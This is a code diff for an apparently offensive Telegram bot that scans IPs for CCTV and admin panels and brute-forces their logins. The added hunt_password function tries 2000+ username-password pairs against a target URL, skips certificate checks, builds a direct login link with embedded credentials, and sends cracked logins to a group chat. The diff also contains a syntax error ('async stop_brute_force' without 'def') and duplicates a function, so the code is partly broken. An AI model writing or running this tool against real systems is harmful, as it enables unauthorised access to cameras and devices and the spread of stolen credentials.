@@ -6,7 +6,7 @@ import re
 import base64
 import random
 import string
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -334,14 +334,14 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return
-    if not (context.user_data.get("awaiting_checklink", False) or (context.args and len(context.args) > 0)):
+    if not context.user_data.get("awaiting_checklink", False):
         await update.message.reply_text(
             "Enter a URL or IP to check for admin panel (e.g., http://86.103.65.158:8443/login or 192.168.1.1:80/login):",
             reply_markup=main_menu_markup()
         )
         return
 
-    input_text = update.message.text.strip() if context.user_data.get("awaiting_checklink") else context.args[0].strip()
+    input_text = update.message.text.strip()
     context.user_data["awaiting_checklink"] = False
     logger.debug(f"Check Link input: {input_text}")
 
@@ -637,6 +637,151 @@ async def check_admin_panel(url: str) -> tuple[bool, list]:
         logger.error(f"Check admin panel error: {e}")
         return False, [f"Error: {str(e)}"]
 
+async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized_user(update, context):
+        await update.callback_query.message.reply_text("Contact admin to access the bot.")
+        await update.callback_query.answer()
+        return
+    query = update.callback_query
+    await query.answer()
+    data = query.data.split("_")
+    ip = data[1]
+    port = int(data[2])
+    admin_id = data[3] if len(data) > 3 else None
+
+    admin_urls = context.user_data.get("admin_urls", {})
+    admin_url = admin_urls.get(admin_id) if admin_id and admin_id in admin_urls else None
+
+    if not admin_url:
+        await query.message.reply_text(
+            "No valid admin URL found to brute-force. Click Check Link again.",
+            reply_markup=main_menu_markup()
+        )
+        return
+
+    context.user_data["brute_force_running"] = True
+    await query.message.reply_text(f"🔥 Trying 2000+ username-password combos on {admin_url}...")
+
+    total_combos = len(BRUTE_COMBOS)
+    checked = 0
+    progress_message = await query.message.reply_text("Starting brute-force...")
+    progress_button = await query.message.reply_text(
+        "Progress: 0%",
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy"),
+            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
+        ]])
+    )
+
+    semaphore = asyncio.Semaphore(5)
+    async def try_creds(url: str, username: str, password: str) -> tuple[bool, str]:
+        async with semaphore:
+            try:
+                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
+                    # Try POST request to login form
+                    async with session.post(
+                        url,
+                        data={"username": username, "password": password},
+                        ssl=False,
+                        allow_redirects=True
+                    ) as response:
+                        if response.status == 200:
+                            html = await response.text()
+                            # Check for successful login
+                            if any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome", "session", "logout"]):
+                                # Verify with GET using Basic Auth
+                                async with session.get(url, auth=(username, password), ssl=False, allow_redirects=True) as verify_response:
+                                    if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in ["dashboard", "admin", "welcome", "session", "logout"]):
+                                        # Construct direct login URL
+                                        parsed = urlparse(url)
+                                        direct_url = f"{parsed.scheme}://{quote(username)}:{quote(password)}@{parsed.hostname}:{parsed.port}{parsed.path}"
+                                        return True, direct_url
+                        return False, ""
+            except Exception as e:
+                logger.error(f"Brute force error for {url}: {e}")
+                return False, ""
+
+    found = False
+    found_credentials = None
+    direct_login_url = None
+
+    for username, password in BRUTE_COMBOS:
+        if not context.user_data.get("brute_force_running", False) or context.bot_data.get("stop_all", False):
+            break
+        success, direct_url = await try_creds(admin_url, username, password)
+        checked += 1
+        if success:
+            found = True
+            found_credentials = (username, password)
+            direct_login_url = direct_url
+            context.user_data["brute_force_running"] = False
+            break
+        if checked % 100 == 0:
+            progress = (checked / total_combos) * 100
+            try:
+                await context.bot.edit_message_reply_markup(
+                    chat_id=progress_button.chat_id,
+                    message_id=progress_button.message_id,
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy"),
+                        InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
+                    ]])
+                )
+                await context.bot.edit_message_text(
+                    chat_id=progress_message.chat_id,
+                    message_id=progress_message.message_id,
+                    text=f"Progress: {progress:.0f}% ({checked}/{total_combos} combos)"
+                )
+                await asyncio.sleep(0.1)
+            except Exception as e:
+                logger.error(f"Progress update error: {e}")
+
+    try:
+        await context.bot.delete_message(
+            chat_id=progress_message.chat_id,
+            message_id=progress_message.message_id
+        )
+        await context.bot.delete_message(
+            chat_id=progress_button.chat_id,
+            message_id=progress_button.message_id
+        )
+    except Exception as e:
+        logger.error(f"Delete message error: {e}")
+
+    if found:
+        await query.message.reply_text(
+            f"🎯 Found: {found_credentials[0]}:{found_credentials[1]}\nDirect Login: {direct_login_url}",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Login Now", url=direct_login_url),
+                InlineKeyboardButton("Main Menu", callback_data="main_menu")
+            ]])
+        )
+        try:
+            await context.bot.send_message(
+                chat_id=GROUP_CHAT_ID,
+                text=f"🎯 Found for {ip}:{port}!\n{found_credentials[0]}:{found_credentials[1]}\nDirect Login: {direct_login_url}",
+                parse_mode="Markdown"
+            )
+            await asyncio.sleep(0.1)
+        except Exception as e:
+            logger.error(f"Group send error: {e}")
+    else:
+        final_text = f"❌ No credentials found. Checked {checked}/{total_combos}" if context.user_data.get("brute_force_running", False) else f"🛑 Stopped! Checked {checked}/{total_combos}"
+        await query.message.reply_text(final_text, reply_markup=main_menu_markup())
+
+    context.user_data["brute_force_running"] = False
+
+async stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized_user(update, context):
+        await update.callback_query.message.reply_text("Contact admin to access the bot.")
+        await update.callback_query.answer()
+        return
+    query = update.callback_query
+    await query.answer()
+    context.user_data["brute_force_running"] = False
+    await query.message.reply_text("🛑 Brute-force stopped.", reply_markup=main_menu_markup())
+
 async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
@@ -792,7 +937,7 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
                     return False, url, [f"Error: {str(e)}"]
 
         if service == "http" and scan_type in ["standard", "special"]:
-            protocols = ["http", "https"] if port in [443, 8443] else ["http"]
+            protocols = ["http", "https"] if	port in [443, 8443] else ["http"]
             tasks = [check_path(protocol, path) for protocol in protocols for path in ADMIN_PATHS]
             responses = await asyncio.gather(*tasks, return_exceptions=True)
             for response in responses:
@@ -848,128 +993,6 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
 
     return "\n".join(results), potential_links, admin_pages
 
-async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized_user(update, context):
-        await update.callback_query.message.reply_text("Contact admin to access the bot.")
-        await update.callback_query.answer()
-        return
-    query = update.callback_query
-    await query.answer()
-    data = query.data.split("_")
-    ip = data[1]
-    port = int(data[2])
-    admin_id = data[3] if len(data) > 3 else None
-
-    admin_urls = context.user_data.get("admin_urls", {})
-    admin_url = admin_urls.get(admin_id) if admin_id and admin_id in admin_urls else None
-
-    if not admin_url:
-        await query.message.reply_text(
-            "No valid admin URL found to brute-force. Run /checklink again.",
-            reply_markup=main_menu_markup()
-        )
-        return
-
-    context.user_data["brute_force_running"] = True
-    await query.message.reply_text(f"🔥 Trying 2000+ username-password combos on {admin_url}...")
-
-    total_combos = len(BRUTE_COMBOS)
-    checked = 0
-    progress_message = await query.message.reply_text("Starting brute-force...")
-    progress_button = await query.message.reply_text(
-        "Progress: 0%",
-        reply_markup=InlineKeyboardMarkup([[
-            InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy"),
-            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
-        ]])
-    )
-
-    semaphore = asyncio.Semaphore(5)
-    async def try_creds(url: str, username: str, password: str) -> bool:
-        async with semaphore:
-            try:
-                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
-                    async with session.post(
-                        url,
-                        data={"username": username, "password": password},
-                        ssl=False,
-                        allow_redirects=True
-                    ) as response:
-                        if response.status == 200:
-                            html = await response.text()
-                            if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
-                                return True
-                        return False
-            except Exception as e:
-                logger.error(f"Brute force error for {url}: {e}")
-                return False
-
-    found = False
-    found_credentials = None
-
-    for username, password in BRUTE_COMBOS:
-        if not context.user_data.get("brute_force_running", False) or context.bot_data.get("stop_all", False):
-            break
-        success = await try_creds(admin_url, username, password)
-        checked += 1
-        if success:
-            found = True
-            found_credentials = (username, password)
-            context.user_data["brute_force_running"] = False
-            break
-        if checked % 100 == 0:
-            progress = (checked / total_combos) * 100
-            try:
-                await context.bot.edit_message_reply_markup(
-                    chat_id=progress_button.chat_id,
-                    message_id=progress_button.message_id,
-                    reply_markup=InlineKeyboardMarkup([[
-                        InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy"),
-                        InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{admin_id or 'all'}")
-                    ]])
-                )
-                await context.bot.edit_message_text(
-                    chat_id=progress_message.chat_id,
-                    message_id=progress_message.message_id,
-                    text=f"Progress: {progress:.0f}% ({checked}/{total_combos} combos)"
-                )
-                await asyncio.sleep(0.1)
-            except Exception as e:
-                logger.error(f"Progress update error: {e}")
-
-    try:
-        await context.bot.delete_message(
-            chat_id=progress_message.chat_id,
-            message_id=progress_message.message_id
-        )
-        await context.bot.delete_message(
-            chat_id=progress_button.chat_id,
-            message_id=progress_button.message_id
-        )
-    except Exception as e:
-        logger.error(f"Delete message error: {e}")
-
-    if found:
-        await query.message.reply_text(
-            f"🎯 Found: {found_credentials[0]}:{found_credentials[1]}\nURL: {admin_url}",
-            parse_mode="Markdown",
-            reply_markup=main_menu_markup()
-        )
-        try:
-            await context.bot.send_message(
-                chat_id=GROUP_CHAT_ID,
-                text=f"🎯 Found for {ip}:{port}!\n{found_credentials[0]}:{found_credentials[1]}\n{admin_url}",
-                parse_mode="Markdown"
-            )
-            await asyncio.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Group send error: {e}")
-    else:
-        final_text = f"❌ No credentials found. Checked {checked}/{total_combos}" if context.user_data.get("brute_force_running", False) else f"🛑 Stopped! Checked {checked}/{total_combos}"
-        await query.message.reply_text(final_text, reply_markup=main_menu_markup())
-
-    context.user_data["brute_force_running"] = False
-
 async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
@@ -1023,7 +1046,7 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, message=Non
         await update.message.reply_text("Contact admin to access the bot.")
         return
     logger.debug("Status check")
-    reply_text = "Bot online! Use /start, /hack, /checklink, or /vuln."
+    reply_text = "Bot online! Use /start, /hack, or inline buttons."
     if message:
         await message.reply_text(reply_text, reply_markup=main_menu_markup())
     else:
@@ -1099,7 +1122,6 @@ def main() -> None:
     application.add_handler(CommandHandler("add", add_user))
     application.add_handler(CommandHandler("remove", remove_user))
     application.add_handler(CommandHandler("status", status))
-    application.add_handler(CommandHandler("checklink", check_link))
     application.add_handler(CommandHandler("reboot", reboot))
     application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
     application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))
